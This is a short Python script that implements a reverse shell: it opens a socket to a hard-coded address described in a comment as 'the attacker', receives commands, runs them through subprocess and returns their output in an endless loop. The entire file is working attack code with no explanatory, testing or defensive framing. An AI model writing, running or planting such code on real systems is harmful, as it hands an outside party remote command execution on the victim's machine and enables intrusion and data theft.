# Modules
import sys,socket,subprocess,os

# Variables
IP = "192.168.0.90"
PORT = 80
BUFFER = 1024

class Runner():
  def __init__(self):
    # Connect to the attacker
    self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.s.connect((IP, PORT))

  # Run commands
  def run_command(self):
    command = self.s.recv(BUFFER).decode()
    output = subprocess.getoutput(command)
    self.s.send(output.encode())

# Looping
conn = Runner()
while True:
  try:
    conn.run_command()
  except ConnectionError:
    sys.exit()